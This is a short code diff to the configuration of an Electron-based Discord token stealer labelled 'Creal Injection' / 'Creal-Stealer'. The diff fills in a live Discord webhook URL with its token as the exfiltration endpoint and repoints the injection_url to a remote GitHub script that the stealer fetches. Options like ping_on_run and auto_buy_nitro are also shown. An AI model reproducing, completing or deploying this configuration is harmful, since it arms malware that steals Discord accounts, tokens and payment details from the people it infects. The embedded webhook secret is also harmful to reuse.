@@ -6,7 +6,7 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', 
+  webhook: 'https://discord.com/api/webhooks/1121894992768680049/2uJmNIW5oEbw-I2z83xj9tb2eqCDODrWNP_fQBWFWDCfgcrbrH2_MzucSHLHOeO6h6b3', 
   webhook_protector_key: '%WEBHOOK_KEY%', 
   auto_buy_nitro: false, 
   ping_on_run: true, 
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Creal Injection', 
   embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/jonassxz/injection/main/injection.js', 
   /**
    
    **/
